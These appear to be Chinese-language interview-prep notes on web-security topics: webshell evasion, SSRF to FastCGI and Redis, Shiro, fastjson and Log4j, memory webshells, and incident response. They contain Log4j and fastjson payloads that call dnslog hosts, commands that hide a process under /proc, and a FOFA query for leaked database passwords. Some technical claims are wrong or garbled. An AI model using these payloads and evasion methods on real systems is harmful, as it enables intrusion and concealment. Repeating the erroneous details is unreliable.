## 0x001.第一个关于免杀，可能会问魔改过什么工具或者脚本没：

#### 这里先说魔改木马：

过d盾的静态免杀，思路就是藏匿函数关键字，或者改变原有的马的格式，常见最基础思路就是改函数名，变量名，调整空行和开头，进阶一点的就是封装相关（变量）函数哥斯拉php中的lograte，把变量函数封装到普通的自定义函数中

#### 再说魔改哥斯拉：

先jar xf解压哥斯拉，在修改代码，增加rsa加密模块，jar cf压缩。
为过流量监测的话有：1.响应内容随机化，插入干扰字符，随机加入html标签  2.第一个避免流量免杀，改cookie，哥斯拉有些马中的cookie有分号

## 0x002.在浏览器中输入一个域名去访问时，浏览器做了什么

1. URL解析：浏览器解析输入的URL，提取出协议，域名与路径信息  
2. 浏览器向主机或者网络中的DNS解析器发送一个查询请求，获取真实ip 
3. 建立TCP相关连接  
4. 发去HTTP请求  
5. 接受响应  
6. 渲染页面  
7. 显示页面 
8. 执行脚本  ：如果网页中包含js代码，浏览器就执行这些脚本，实现交互与动态效果
9. 关闭连接          

## 0x003.拿到java系统的代码时，审计的流程是怎样的

先看功能点

再看控制块

后面有稍微详细一点的介绍，这里略过

## 0x004.一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名

1.谷歌语法   site:swpu.edu.cn  -www.swpu.edu.cn

2.whois

3.爬虫，针对该单位已知的网站上的链接来爬，逐个分析

4.fofa上查，body=”“  

5.域名注册商查，可以通过注册商的查询接口搜索与目标单位相关的其他一级域名。

## 0x005.sql注入，xxe，xss,ssrf,csrf原理以及如何防御，直接默写  

  #### ssrf

服务器请求伪造，由攻击者构造形成由服务器发起请求的安全漏洞，一般情况下用ssrf来攻击内网，即外网无法访问的内部系统

##### 成因

简单点说说就是服务器提供了从其他服务器获取数据的功能，但没有对目标地址做过滤与限制

##### 使用：

用内网访问首先用http协议对内网的web应用进行访问，就查看查看php，用php伪协议读

##### php.ini参数设置

`allow_url_fopen`：默认值On，允许url里的封装协议访问文件。

`allow_url_include`：默认值Off，不允许url里的封装协议包含文件

###### Gopher协议的利用 

`gopher`协议是一种信息查找系统，他将`Internet`上的文件组织成某种索引，方便用户从`Internet`的一处带到另一处。在`WWW`出现之前，`Gopher`是`Internet`上最主要的信息检索工具，Gopher站点也是最主要的站点，使用`tcp70`端口。**利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面。**gophernus工具基于gopher开发出的专门针对ssrf攻击的工具

##### 攻击FastCGI协议  

`php-fpm`攻击实现原理

当设置php环境变量为：`auto_prepend_file = php://input;allow_url_include = On`，就会在执行php脚本之前包含`auto_prepend_file`文件的内容，`php://input`也就是POST的内容，这样我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了`php-fpm`任意代码执行的攻击。

###### FastCGI

如果端口9000是开放的，则SSRF漏洞可能存在并且可能导致RCE。为了利用它，您**需要提供一个目标主机上必须存在的文件名（首选`.php`）**。

攻击流程总结：打个比方有个index.php，接收url参数，那就构造一个payload写入一句话，用gophernus工具生成payload，注意编码次数，get解码一次，curl解码一次 。执行之后webshell工具连接拿到payload

##### 攻击redis  

用redis未授权访问（6379），写ssh-keygen公钥登录，利用计划任务反弹shell，直接写webshell等

## 0x006.什么是JWT

简单点说就是个生成token得一个规范，一种认证协议（jason，web，token），用户传一个用户身份信息给服务器，服务器通过加密算法+hash等对身份信息做一个加密处理（签名），返回给用户，当用户据要实现快速认证时，配合之前发送得身份信息以及服务器返回的签名就可以执行快速认证



## 0x007.如何探测waf的存在，如何判断waf类型，如何绕过  

  一般敏感操作被waf识别都会由明确的提示或者比较奇怪的错误代码，判断waf类型可以用工具wafw00f，nmap也可以

云waf主要利用dns技术，用户的请求先发送到运动节点解析，没问题才发给真实服务器

硬件waf主要针对请求包进行解析，通过安全规则库来进行相关匹配

绕过云waf可以寻找源站来直接访问，可以通过子域名来定位真实ip；

然后就是传统的资源限制来绕，比如填垃圾字符，或者高并发

## 0x008 内存马的了解  

#### 什么是内存马  

内存马是一种无文件的webshell，简单来说是服务器上不会存在需要连接的webshell脚本。内存马的原理就是在web组件或者应用程序中，注册一层访问路由，访问者通过这层路由来执行我们控制器中的代码，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。  

#### 内存马类型

```php+HTML
`1.servlet-api型 通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马 2.字节码增强型 通过java的instrumentation动态修改已有代码，从而实现命令执行等功能`
```

#### 内存马排查  

可以利用java agent技术遍历所有已经加载到内存的class，先判断哪些是内存马，是则内存查杀，首要要识别内存马的特征  

###### 1、检测  

1. filter名字一般比较特别
2. web.xml没有filter配置  
3. 特殊的calssloader加载，反序列化漏洞喜欢利用templateslmap和bcel执行任意代码
4. 对应的classloader路径下没有class文件
5. filter的doFile方法中有恶意代码  

###### 2、 内存马查杀  

1. 清除内存马中的filter的恶意代码

2. 中间件注销filter  

   第一种方法比较通用

#### 前置知识  

1.1.什么是servlet？ 

**java servlet是运行在web服务器或应用服务器上的程序**，他是作为来自web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用数据之间的中间层。 <font color="red">`它负责处理用户的请求，并根据请求生成响应的返回信息提供给用户。`</font> 

1.2.请求的处理过程    

客户端发起请求，Servlet容器收到请求并根据请求信息封装成HttpServletRequest和HttpServletResponse对象，再调用HttpServlet的init()方法`(init方法只在第一次请求的时候被调用)`和service()方法。完成业务逻辑处理后返回给Servlet容器，然后给容器结果返回给客户端。

2.1 什么是Filter?

filter也被称为过滤器，是对Servlet容器传给Web资源的request对象和response对象进行检查和修改，Filter 不是 Servlet，不能直接访问，它本身也不能生成 request 对象和 response 对象，它只能为 Web 资源提供过滤功能

2.2 处理过程

Web服务器根据Filter在web.xml文件的注册顺序，决定在调用哪个Filter，当第一个Filter的doFile方法被调用的时候，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法。在doFilter方法中，开发人员如果调用了FilterChain对象的doFilter方法，则web服务器会检查FilterChain对象中是否还有filter，如果有，则调用第2个filter，如果没有，则调用目标资源。

3.1 什么是Listener?

Listener监听器用于监听Web应用中的某些对象的创建、销毁、增加、修改、删除等动作的发生，然后做出响应的响应处理。**当监听范围的对象的状态发生变化的时候，服务器自动调用监听器对象中的方法**。常用于统计网站在线人数、系统加载时进行信息初始化、统计网站的访问量等等。

3.2 Listener的相关概念

事件：方法调用、属性改变、状态改变等。

事件源：被监听的对象（ 例如：request、session、servletContext）。

监听器：用于监听事件源对象 ，事件源对象状态的变化都会触发监听器。

注册监听器：将监听器与事件源进行绑定

## 0x009.拿到phpinfo重点关注哪些  

1. 利用phpinfo获取cookie，phpinfo中很有可能藏着大量的信息，其中说不定就包含着cookie
2. 看看有没有数据库相关的连接信息，有的会露出ip，端口用户名跟密码
3. 补充一点，fofa语句：”DB_PASSWORD“ && title==”phpinfo()“
4. 查看版本，服务器信息，环境变量和扩展等
5. allow_url_include，allow_url_fopen等敏感配置是否开启，进而搞搞文件包含漏洞搞命令执行什么的
6. 看seesion，看ip，开暴露端口
7. 看看是否开启fascgi，fastcgi的版本，是否有解析漏洞，进而远程命令执行，任意文件读取等

##  0x010. Windows基本系统进程以及危险进程名单

1. **Lsass.exe lsass.exe 是 Windows 中的一个系统进程，负责处理用户登录验证、密码策略等安全相关任务。攻击者可能会针对 lsass.exe 进行攻击，以获取敏感信息或执行恶意代码  **
2. **Explorer.exe explorer.exe 是 Windows 的资源管理器进程，负责管理桌面、任务栏和文件资源。攻击者可能会利用 explorer.exe 进程来执行恶意操作或进行文件系统攻击 **
3. Spoolsv.exe 管理缓冲区中的打印和传真作业
4. Svchost.exe 这个进程要着重说明一下，有不少朋友都有这种错觉：若是在“任务管理器”中看到多个Svchost.exe在运行，就觉得是有病毒了。其实并不一定，系统启动的时候，Svchost.exe将检查注册表中的位置来创建需要加载的服务列表，如果多个Svchost.exe同时运行，则表明当前有多组服务处于活动状态；多个DLL文件正在调用它  **svchost.exe 是一个通用主机进程，用于承载多个系统服务。攻击者可能会利用 svchost.exe 进程来隐藏恶意代码或攻击系统服务。**
5. Services.exe 系统服务的管理工具  
6. Smss.exe这是一个会话管理子系统，负责启动用户绘画
7. alg.exe 这是一个应用层网关服务用于网络共享。
8. **winlogon.exe（Windows 登录管理器）：winlogon.exe 是 Windows 登录管理器进程，负责处理用户登录和注销过程。它与用户交互，并启动用户环境。攻击者可能会试图利用 winlogon.exe 进程来执行恶意操作。**

## 0x011. 常见的php反序列化的魔术方法

| **魔术方法**                      | **触发时机**                                                 |
| --------------------------------- | ------------------------------------------------------------ |
| __construct()                     | 类的构造函数，在类实例化对象时自动调用构造函数               |
| __destruct()                      | 类的析构函数，在对象销毁之前自动调用析构函数                 |
| __sleep()                         | 在对象被序列化（使用 serialize() 函数）之前自动调用，可以在此方法中指定需要被序列化的属性，返回一个包含对象中所有应被序列化的变量名称的数组 |
| __wakeup()                        | 在对象被反序列化（使用 unserialize() 函数）之前自动调用，可以在此方法中重新初始化对象状态。 |
| __set($property, $value           | 当给一个对象的不存在或不可访问(private修饰)的属性赋值时自动调用，传递属性名和属性值作为参数。 |
| __get($property)                  | 当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数。 |
| __isset($property)                | 当对一个对象的不存在或不可访问的属性使用 isset() 或 empty() 函数时自动调用，传递属性名作为参数。 |
| __unset($property)                | 当对一个对象的不存在或不可访问的属性使用 unset() 函数时自动调用，传递属性名作为参数。 |
| __call($method, $arguments)       | 调用不存在或不可见的成员方法时，PHP会先调用__call()方法来存储方法名及其参数 |
| __callStatic($method, $arguments) | 当调用一个静态方法中不存在的方法时自动调用，传递方法名和参数数组作为参数。 |
| __toString()                      | 当使用echo或print输出对象将对象转化为字符串形式时，会调用__toString()方法 |
| __invoke()                        | 当将一个对象作为函数进行调用时自动调用。                     |
| __clone()                         | 当使用 clone 关键字复制一个对象时自动调用。                  |
| __debugInfo()                     | 在使用 var_dump() 打印对象时自动调用，用于自定义对象的调试信息 |
| __set_state($array)               | 在使用 var_export() 导出类时自动调用，用于返回一个包含类的静态成员的数组。 |

## 0x012.php中哪些函数有防护作用    

| escapeshellarg                                               | 传⼊参数添加单引号并转义原有单引号 ⽤于防⽌命令注⼊          |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| escapeshellarg                                               | 转义字符串中的特殊符号 ⽤于**防⽌命令注⼊**                  |
| addslashes                                                   | *在单引号（'）、双引号（"）、反斜线（\）与 NUL前加上反斜线* 可⽤于防⽌SQL注⼊ |
| PDO::quote                                                   | 转义特殊字符 并添加引号；$pdo-<quote($_get['name'])          |
| PDO::prepare                                                 | 预处理SQL语句 有效防⽌SQL注⼊ (推荐),$pdo->prepare("select * from ~~~") |
| htmlspecialchars 和 htmlentities                             | 将特殊字符转义成html实体 可⽤于防⽌XSS                       |
| intval($input) floatval() floatval() floor() (int)$input     | num+**0** 将输⼊强制转换为整数/浮点 常⻅于防⽌SQL注⼊        |
| data:// php://filter 或 php://input 伪协议                   | php.ini allow_url_include 设置为 on，我记得还有一个要开启，尤其是input，还跟编码有关系 |
| mysqli::real_escape_string mysqli::escape_string mysqli_real_escape_string  mysql_real_escape_string SQLite**3**::escapeString | 经过以上函数处理后的字符串不可直接⽤于sql查询拼接 需要使⽤引号包裹后拼接到sql语句中 否则仍可导致sql注⼊ |
| **审计时重点查找 extractTo⽅法**,判断解压⽬录是否在web⽬录下 是否检查压缩包内⽂件类型 如果不在web⽬录下也可以使⽤.. 进⾏⽬录穿越控制上传⽬录 到web⽬录下 或者在权限⾜够的情况下写⼊⽂件到系统关键⽬录 (⾃启动 定时任务ssh公钥 覆盖shadow 等) |                                                              |

#### **说下平时怎么做代码安全审计的，具体思路？**

代码审计的核心思想就是追踪参数，而追踪参数的步骤就是程序执行的步骤，说白了代码审计就是一个跟踪程序执行步骤的一个过程，

1、逐条读代码，了解整个框架的流程过后，从我一般是先阅读权限控制模块，然后直接通读Controller模块,然后跟踪看看, 后面你会发现很多类似的代码，从而提高通读的速度的。可以看安全客的这篇代码审计。

2、敏感函数回溯(使用工具审计)，结合业务场景，逐个功能点进行测试，根据输入来追踪变量的最终形态；一些不在显示页面的功能点所存在的漏洞可能就会挖掘不到

3、定向功能分析   注意以上是针对java的方法，但是php也大相径庭



#### **问：会用静态代码安全审计工具吗？知道这些工具的原理是什么吗？**

答：Cobra：定位于静态代码安全分析的工具,目标是为了找出源代码中存在的安全隐患或者漏洞。

AST树和token流

上面是针对java的

下面是针对php的：

工具：seay   提供了一键自动审计，函数查询，代码高亮编辑器，自定义审计规则，代码调试等强大功能

## 0x13.shiro相关问题  

#### shiro550漏洞简介  （CVE-2016-4437）

shiro-550 主要是由**shiro的rememberMe内容反序列化**导致的命令执行漏洞，造成的原因是默认加密密钥是硬编码再shiro源码中（github中都有相关源码），任何有访问源代码的人都可以知道默认加密密钥。于是攻击者可以创建一个而已对象，对其进行反序列化、编码、然后将其作为cookie的remmemberMe字段内容发送，shiro将对其解码和反序列化，导致服务器执行恶意代码。

修复建议：不用默认加密密钥，改为随机生成密钥；更新shiro版本

> - 补充：Shiro<=1.2.4版本中AES加密时采用的key是**硬编码**在代码中的，于是我们就可以构造RememberMe的值，然后让其反序列化执行。

#### 漏洞原理    

##### Shiro服务器识别身份加解密处理的流程

###### 一、加密

1. 用户使用账号密码进行登录，并勾选”Remember Me“。
2. Shiro验证用户登录信息，通过后，查看用户是否勾选了”Remember Me“。
3. 若勾选，则将用户身份序列化，并将序列化后的内容进行AES加密，再使用base64编码。
4. 最后将处理好的内容放于cookie中的rememberMe字段。

###### 二、 解密

1. 当服务端收到来自未经身份验证的用户的请求时，会在客户端发送请求中的cookie中获取rememberMe字段内容。
2. 将获取到的rememberMe字段进行base64解码，再使用AES解密。
3. 最后将解密的内容进行反序列化，获取到用户身份。

###### 三、key

AES加密的密钥Key被硬编码在代码里

#### shiro721（CVE-2019-12422）

0x01 首先讲一下面试官经常问的一个问题

**Shiro550和Shiro721的区别是什么**

> - Shiro550只需要通过碰撞key，爆破出来密钥，就可以进行利用。 Shiro721的ase加密的key一般情况下猜不到，是系统随机生成的，并且当存在有效的用户信息时才会进入下一阶段的流程所以我们**需要使用登录后的rememberMe Cookie，才可以进行下一步攻击**

0x02 漏洞指纹  

- URL中含有Shiro字段
- cookie中含有rememberMe字段
- 返回包中含有rememberMe

0x03 漏洞介绍

 在Shiro721中，Shiro通过AES-128-CBC对cookie中的`rememberMe`字段进行加密，所以用户可以通过`Padding Oracle`加密生成的攻击代码来构造恶意的`rememberMe`字段，进行反序列化攻击，需要执行的命令越复杂，生成payload需要的时间就越长。

###### 漏洞原理  

 由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，（这里应该是有相关的填充错误）用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，用有效的RememberMe cookie作为Padding Oracle Attack 的前缀，然后制作精心制作的RememberMe来执行Java反序列化攻击  

 Padding Oracle Attack（填充Oracle攻击）是一种针对加密算法使用填充的安全漏洞攻击。在加密通信中，填充用于将明文数据扩展到加密算法块大小的倍数。在此攻击中，攻击者利用填充的响应信息来推断出加密算法中的秘密信息。

 Shiro Padding Oracle Attack利用了Shiro框架中的身份验证过程中的一个漏洞，该漏洞允许攻击者通过填充信息的不同响应时间来确定身份验证过程中的错误。通过不断尝试不同的填充方式，攻击者可以逐步推断出加密秘钥，并最终获取访问权限。

###### 攻击流程 

 登录网站，并从cookie中获取RememberMe。使用RememberMe cookie作为Padding Oracle Attack的前缀。加密syserial的序列化有效负载，以通过Padding Oracle Attack制作精心制作的RememberMe。请求带有新的RememberMe cookie的网站，以执行反序列化攻击。攻击者无需知道RememberMe加密的密码密钥。

#### Shiro 认证绕过漏洞 （CVE-2020-1957）

###### 漏洞原理  

 在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，**攻击者通过构造`..;`这样的跳转**，可以绕过Shiro中对目录的权限限制。

URL请求过程：

- 客户端请求URL:`/xxx/..;/admin/`
- Shrio 内部处理得到校验URL为`/xxxx/..`,校验通过
- SpringBoot 处理`/xxx/..;/admin/`, 最终请求`/admin/`, 成功访问了后台请求。

#### Shiro 身份验证绕过 （CVE-2020-13933）

###### 漏洞简介

 CVE-2020-11989的修复补丁存在缺陷，在1.5.3及其之前的版本，由于shiro在处理url时与spring仍然存在差异，依然存在身份校验绕过漏洞由于处理身份验证请求时出错，远程攻击者可以发送特制的HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。

 该漏洞产生的原因主要是`shiro`层在处理`url`上和`spring`上存在差异，主要是在处理`;`上的问题，通过构造含有`;`符号的`url`即可绕过`shiro`在权限上的处理，而`spring`不负责权限管控，所以最终会导致权限绕过。`ant`风格的路径仅出现一个`*`时才能成功，而`**`无法绕过，`*`：匹配一个或者多个任意的字符。

`**`：匹配零个或者多个目录。



#### Shiro 授权绕过 （CVE-2022-32532）

这个没看懂  



## 0x14.Fastjason漏洞  

#### 漏洞简介  

fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。即fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。  

#### 指纹特征  

1.根据返回包判断  

任意抓个包，提交方式改为POST，花括号不闭合。返回包在就会出现fastjson字样。当然这个可以屏蔽！



![image-20230420173222817](https://image.3001.net/images/20230505/1683291039_6454fb9f84c9c85d31a0e.png!small)



2.利用DNSlog盲打  

构造一下payload，利用sdnslog平台接受。  

> - {"zeo":{"@type":"java.net.Inet4Address","val":"dnslog"}}

#### 漏洞原理  

fastjson在解析json的过程中，支持使用==autoType==来实例化某一个具体的类，==autoType==标注了类对应的原始类型，方便在反序列化的时候定位到具体类型，fastjson在对JSON字符串进行反序列化的时候，就会读取`@type`到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链,造成远程代码执行。

因为有了==autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取`@type`到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。那 么就可以利用这个特性，自己构造一个JSON字符串，并且使用`@type`指定一个自己想要使用的攻击类库。==

在fastjson中我们使用`JdbcRowSetImpl`进行反序列化的攻击，我们给此类中的`setDataSourcesName`输入恶意内容（rmi链接），让目标服务在反序列化的时候，请求rmi服务器，执行rmi服务器下发的命令，从而导致远程命令执行漏洞





后面没看懂，这个后面再写  

## 0x15.宽字节注入

>  mysql默认是GBK编码，BGK汉字编码，两个字节代表一个汉字，一个字节代表一个英文或者数字
>
>  那么，两个字节就是宽字节，一个字节就是窄字节

#### 漏洞出现原因 

> -mysql默认使用BGK编码，当mysql使用bgk编码时，会认为两个字符是一个汉字，(前一个ASCII码要大于128，才会得到汉字范围)，这就是mysql的特性，因为BGK是多字节编码，它认为两个字节是一个汉字，我们在代入参数时，代入 %df%27，%27 是 单引号 的url编码

## 缓冲区溢出，堆溢出，栈溢出，文件结构  

elf文件开头 7f  45 4c 46

PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件  文件开头4D 5A

预处理，编译，汇编，链接

由高到低：栈，堆，未初始化数据，数据段，代码段

## 0x16.Log4j2  

Log4j2是一个基于JAVA的日志记录工具，利用该工具将程序的输入输出信息进行日志记录。Log4j2某些功能存在递归解析功能，导致攻击者可以直接构造恶意请求，触发rce；

例如当开发者想在日志中打印今天的日期，则只需要输出`${data:MM-dd-yyyy}`，此时log4j会将${}中包裹的内容单独处理

其实打印日期，打印系统变量这种对系统而言构不成什么威胁，最重要的原因是log4j支持JNDI协议。

#### 漏洞原理 

Apache log4j2-RCE 漏洞是由于Log4j2提供的lookup功能下的Jndi ==Lookup==模块出现问题所导致的，==该功能模块在输出日志信息时允许开发人员通过相应的协议去请求远程主机上的资源。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。==

jndi 解析器将通过 jdk 获取 jndi 对象，并使用这个 jndi 对象替换原有文本进行打印。 我们将 jndi 对象理解成为一个从程序外部获取的 Java 程序对象就可以了。jdk中提供了多种不同 jndi 对象的获取方式，获取方式可以称为schema，所以正常的包含jndi的日志记录方式如下：

> - ```
>   logger.info("system propety: ${jndi:schema://url}");
>   ```

上述schema和url需替换成真实的内容方可生效。 其中，schema 是查找jndi对象的方式，jdk中支持 corbname, dns, iiop, iiopname, ==ldap==, ldaps, ==rmi==几种schema。 url是几种不同的schema下jndi的路径。不同的schema，url路径的配置方法不同。常用的schame是ldap，其url写法比较简单：`jndi:ldap://xxx.dnslog.cn`

具体payload例如：${jndi:idap://${sys:java.version}.dnslog}是利用JNDI发送DNS请求的Payload： /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.1c6zpg.dnslog.cn}

 jdk将从url指定的路径下载一段字节流，并将其反序列化为Java对象，作为jndi返回。反序列化过程中，即会执行字节流中包含的程序。

 因此，如果攻击者能够控制日志打印的内容，就可以使目标服务器从攻击者指定的任意url地址下载代码字节流，攻击者在字节流中附带的代码就会在目标服务器上执行。

 那么问题来了，攻击者如何控制服务器上记录的日志内容呢？

 非常简单！ 大部分web服务程序都会对用户输入进行日志记录。例如：用户访问了哪些url，有哪些关键的输入等，都会被作为参数送到log4j中，我们在这些地方写上`${jndi:ldap://xxx.dnslog.cn}`就可以使web服务从`xxx.dnslog.cn`下载字节流了。

总结一下感觉就是触发了jndi注入，jndi注入常用的是通过rmi和ldap（轻型目录访问协议）两种服务（配合${}进行执行）



## 0x17.PHP代码审计思路  

首先看权限控制块（能否水平越权或者垂直越权）

再看控制块（未授权，无鉴权，鉴权绕过）

追踪参数，参数是否可控（注入等）

检测敏感函数（反序列化攻击）

存在注入的地方是否进行了处理

存储信息是否采用了相关加密处理

密码规则，存放位置等

### 0x18.ThinkPHP框架  

thinkphp是一个mvc框架，即模型，视图，控制器，使用thinkphp框架开发的项目主要审计**模型和控制器文件**

![XtRdD.png](https://i.imgs.ovh/2023/10/12/XtRdD.png)



## 0x19.给你一个日志，你如何分析，应急情况如何检查，比如查挖矿病毒等  

关于日志分析，首先是查看日志的记录，分析从什么时间开始日志出现异常，根据日志的相关信息来进行分析出现了什么样的问题，结合其他日志，如访问日志等，分析出引发相关日志的进程或操作，找到相关进程，找到记录该进程的相关信息，分析是什么原因引发的问题，溯源ip等。

如果中挖矿，首先对相关设备进行一个快照，快照之后根据影响程度来判断该不该先杀该进程，如果杀不掉该怎么办？杀的掉先杀，根据快照找日志相关记录，分析时间，进程，lsof查该进程涉及了多少文件，对这些文件逐一检查，看哪个中了挖矿，定位其矿池等（netstat，lsof查相关连接ip），清楚和修复，针对相关问题做升级，杀软升级，更新补丁等

一般针对无法删除的文件等，用chattr命令解除相关限制即可

## 0x20.如何查找隐藏进程  

#### 前言  

进程是执行程序的过程，类似于按照图纸，真正去盖房子的过程。

同一个程序可以执行多次，每次都可以在内存中开辟独立的空间来装载，从而产生多个进程。不同的进程还可以拥有各自独立的IO接口。操作系统的一个重要功能就是为进程提供方便，比如说为进程分配内存空间，管理进程的相关信息等等，就好像是为我们准备好了一个精美的地址。

进程信息是proc目录下动态生成，每个动态创建的进程ID号下面详细的记录了关于该进程的fd,mem,io,cpuset等进程信息。

Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。

**通过它可以访问系统内核数据。**用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。

由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统动态的。在/proc下还有三个很重要的目录：net，scsi和sys。sys目录是可写的，可以通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。例如，如果系统不支持scsi，则scsi 目录不存在。

除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口。

读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。

#### 根据前言我们考虑通过覆盖proc中相关信息来使得ps，lsof等命令无法查找指定的进程信息  

 利用mount —bind 将另外一个目录挂载覆盖至/proc/目录下指定进程ID的目录，我们知道ps、top等工具会读取/proc目录下获取进程信息，如果将进程ID的目录信息覆盖，则原来的进程信息将从ps的输出结果中隐匿。

比如当前有个进程 id:4284

> - ┌──(root㉿kali)-[~/桌面]
>   └─# ps -aux| grep test
>   root        4284  0.0  0.4  16932  8952 pts/0    S+   21:34   0:00 python3 test.py
>   root        4997  0.0  0.1   6568  2144 pts/1    S+   21:35   0:00 grep --color=auto test

然后我们将该进程进行隐藏。创建一个空目录 然后将该空目录进行挂载  

> - ┌──(root㉿kali)-[~/桌面]
>   └─# mkdir -p /empty/dir
>
>   ┌──(root㉿kali)-[~/桌面]
>   └─# mount -o bind /empty/dir/ /proc/4284

现在我们看不到进程信息了  、

> - ┌──(root㉿kali)-[~/桌面]
>   └─# ps -aux| grep test
>   root        5717  0.0  0.1   6568  2244 pts/1    S+   21:36   0:00 grep --color=auto test

#### 现在说说怎么找  

###### 方式一 通过mounts相关信息来查找  

> - ┌──(root㉿kali)-[~/桌面]
>   └─# cat /proc/mounts   

> - /dev/sda1 /proc/4284 ext4 rw,relatime,errors=remount-ro 0 0

######  方式二 一般查找隐藏进程的话都是使用工具，例如unhide工具,或者sysdig工具

> - curl -s https://s3.amazonaws.com/download.draios.com/stable/install-sysdig | sudo bash

[root@docker]-[~]-#sysdig -c topprocs_cpu   

这里我就不给图了  

关于unhide  

> -apt 或者yum install unhide即可

暴力扫描隐藏进程：

> - unhide checkbrute  

![XtDsR.png](https://i.imgs.ovh/2023/10/12/XtDsR.png)

## 0x21.针对项目中的渗透测试  

当时给出来的信息就是甲方公司的名字，所以一开始的信息收集就是从名字开始的，用谷歌搭配谷歌语法来找到该公司的相关网站以及子域名等，然后就是对相关资产查找，找到其备案号，确认ip，（这里为了确认没有cdn专门使用了国外多ping网站进行测试）github上找该公司和其开发公司的仓库，fofa上找指纹，开放端口。后面针对几个子站和主站进行fuzz，搭配的御剑和kali中自带的fuuf工具进行目录测试。同时抓包来分析http头，cookie等，网页源码，特殊文件等。最后找到该公司有一个子站登录处看到有remmerbe me字段，就怀疑是不是用了shiro框架或者spring security，当时图省事手里有shiro相关攻击工具就直接拿去打，运气好碰见一个认证绕过漏洞直接到了后台，该后台可以看到服务器上存储的数据和存储位置，所以这里直接写了个马进行上传，但是被杀了。然后对内大佬针对哥斯拉的木马重新改写，完成了免杀。最后也是成功拿到webshell。后续将fscan等工具传上去，初步对该边界机连接情况做一个了解，然后netstat，ifconfig命令查看其连接情况，以及网卡信息等，摸清了该边界机的网络连接情况，以及该子网内相关的端口开放，服务器版本等。内网中的横向，提权，域渗透的相关工作当时我没参与。

## 0x22.实习时都做了什么  

当时在启明做安服，每天有个事儿就是运营中心做监测（IDS）分析系统是否误报，哪些攻击是高危，封ip等，当时碰到过甲方底下有单位中挖矿，配合他们单位的网安负责人进行相关处理，然后对防护策略进行修改等，然后我有一项任务就是每个星期给甲方写安全预警，他们使用的大部分设备我们都有记录，针对他们的软硬件等，就要去追踪各大漏洞情报平台，跟进相关漏洞，做评估，是否会影响到他们的安全。同时针对他们的云系统，进行相关防护设备策略的更新。还有就是公司自己的漏洞对甲方的扫描，针对漏扫的结果要实时跟进，写报告给甲方让他们自己的运维修补等。然后是简历中的两个项目，一个是重保，一个是渗透。还有就是漏洞复现，印象最深的就是当时一个cms的任意文件上传，具体名字我记不得了。

也是从那个时候开始接触到挖洞的，开始去接触代码审计，目前审了一个织梦cms的rce漏洞，已经递交cnvd，目前是二审阶段。当时那个cms针对敏感函数的过滤并没有做完全且存在逻辑漏洞，所以仔细分析之后仍然找到了一个敏感函数，并且针对相关过滤通过自定义函数的方式进行了绕过。基于此构造包，搭配该cms相关功能，找到了生成的php页面，构造了一个不经过任何检查的传参点，并且因为敏感函数的原因执行输入的命令

当时图省事还写过工具，因为最终是否要封禁的ip是要在数据库中根据相关白名单来进行排除确认的，所以就写了个python脚本根据语句的搜索结果调用一个api来判断该ip是否为国外ip，是国外ip直接ban。
